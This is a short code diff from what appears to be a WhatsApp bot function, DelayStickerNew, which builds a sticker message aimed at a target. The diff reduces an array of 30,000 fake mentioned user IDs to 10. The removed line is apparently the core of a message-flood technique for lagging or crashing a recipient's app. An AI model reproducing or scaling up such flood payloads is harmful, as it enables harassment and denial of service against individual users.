@@ -44,7 +44,7 @@ export default handler;
 async function DelayStickerNew(Ken, target) {
   const stickerUrl = "https://mmg.whatsapp.net/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0&mms3=true";
 
-  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
+  const mentionedJid = Array.from({ length: 10 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
 
   const stickerMsg = {
     key: {
